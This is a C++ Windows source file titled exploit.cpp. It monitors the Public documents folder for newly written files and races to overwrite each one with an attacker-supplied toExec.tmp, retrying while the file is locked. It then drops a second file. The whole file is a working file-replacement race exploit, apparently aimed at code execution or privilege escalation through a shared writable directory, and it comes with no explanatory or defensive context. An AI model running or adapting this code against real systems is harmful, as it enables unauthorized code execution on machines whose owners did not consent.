// exploit.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"


int main()
{
	HANDLE WINAPI hDirectory = INVALID_HANDLE_VALUE;
	HANDLE WINAPI hFile = INVALID_HANDLE_VALUE;
	WCHAR buff[1024] = { 0 };
	DWORD dwBytesReturned = 0;
	LPTSTR dirPath = TEXT("C:\\Documents and Settings\\Public");
	LPTSTR toExecPath = TEXT("toExec.tmp");
	std::wstring fileName;
    DWORD success = 0;

	printf("Lets get Started!!\n");

	// open handle to the directory we will monitor (where the file we will be replacing will be created)
	if ((hDirectory = CreateFile(
		dirPath,
		FILE_LIST_DIRECTORY,
		(FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE),
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_BACKUP_SEMANTICS,
		NULL
	)) == INVALID_HANDLE_VALUE)
	{
		_tprintf(TEXT("Error getting handle to directory: %u\n  failed replacing file with Error: %u\n"), GetLastError());
		return 1;
	}

	// main loop
	while (TRUE) {
		//wait for change in the monitored directory
		if (ReadDirectoryChangesW(
			hDirectory,
			(LPVOID)buff,
			sizeof(buff),
			TRUE,
			FILE_NOTIFY_CHANGE_LAST_WRITE,
			&dwBytesReturned,
			NULL,
			NULL)
			== FALSE)
		{
			_tprintf(TEXT("Error monitoring changes: %u\n  failed replacing file with Error: %u\n"), GetLastError());
			FlushFileBuffers(hDirectory);
			CloseHandle(hDirectory);
			return 2;
		}
		// if change detected
		else
		{
			PFILE_NOTIFY_INFORMATION NotifInfo = (PFILE_NOTIFY_INFORMATION)buff;

			do {
				WORD FileNameLength = NotifInfo->FileNameLength / 2;
				fileName.assign(NotifInfo->FileName, NotifInfo->FileName + FileNameLength);
				std::wstring fullFilePath = dirPath;
				fullFilePath.append((TEXT("\\") + fileName));
				// try to replace file
                do {
                    success = CopyFile(toExecPath, fullFilePath.c_str(), FALSE);
                } while (!success && GetLastError() == 32); //file is still being used.

                if(!success)
                {
					_tprintf(TEXT("\ndetected change in file: %s !\n  failed replacing file with Error: %u\n"), fileName.c_str(), GetLastError());
				}
				else {
					_tprintf(TEXT("\ndetected change in file: %s !\n  successfully replaced file!\n"), fileName.c_str());
					CopyFile(TEXT("1.tmp"), TEXT("C:\\Documents and Settings\\Public\\1.jpg"), FALSE);
					std::cout << "exiting"; Sleep(2000); std::cout << "."; Sleep(2000); std::cout << "."; Sleep(2000); std::cout << ".\n"; Sleep(4000);
					FlushFileBuffers(hDirectory);
					CloseHandle(hDirectory);
					return 0;
				}

				NotifInfo = (PFILE_NOTIFY_INFORMATION)((char*)NotifInfo + NotifInfo->NextEntryOffset);
			} while (NotifInfo->NextEntryOffset != 0);
		}
	}
	return 0;
}

